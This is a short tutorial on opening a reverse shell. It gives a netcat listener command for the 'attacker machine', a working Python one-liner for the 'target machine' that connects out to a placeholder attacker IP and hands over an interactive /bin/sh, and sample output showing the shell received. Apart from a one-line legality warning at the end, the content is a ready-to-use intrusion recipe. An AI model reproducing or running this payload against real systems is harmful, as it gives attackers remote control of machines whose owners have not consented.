# Reverse Shell with Python and Netcat

This guide shows you how to set up a simple reverse shell using Python on the target machine and Netcat on the attacker machine.

## Prerequisites

- **Python3** installed on the target machine.
- **Netcat** installed on the attacker machine.

## Step 1: Set up Listener (Attacker Machine)

Use Netcat to listen for incoming connections:

```bash
nc -lnvp 1234
```

Explanation of flags:
- `-l`: Listen mode, for incoming connections.
- `-n`: Numeric-only IP addresses, no DNS resolution.
- `-v`: Verbose output.
- `-p`: Specify the port number (in this example, `1234`).

Replace `1234` with your desired port if necessary.

## Step 2: Execute Reverse Shell (Target Machine)

Run this command on the target machine, replacing `IP_ADDRESS` with your attacker machine's IP and `1234` with your chosen port number:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Explanation:
- Establishes a TCP socket connection to the attacker’s IP and port.
- Redirects standard input (`stdin`), standard output (`stdout`), and standard error (`stderr`) to the socket.
- Executes a shell (`/bin/sh`) to provide an interactive shell session back to the attacker.

## Step 3: Receiving the Connection

Once the reverse shell command is executed, the attacker’s terminal running Netcat will establish a connection, giving you an interactive shell:

```bash
Connection from 10.23.103.XXX port YYYY [tcp/*] accepted
/bin/sh: 0: can't access tty; job control turned off
$ whoami
user
$
```

Now you have control over the target machine's shell.

## Warning
Use this knowledge responsibly and ethically. Unauthorized use of this method is illegal and unethical.

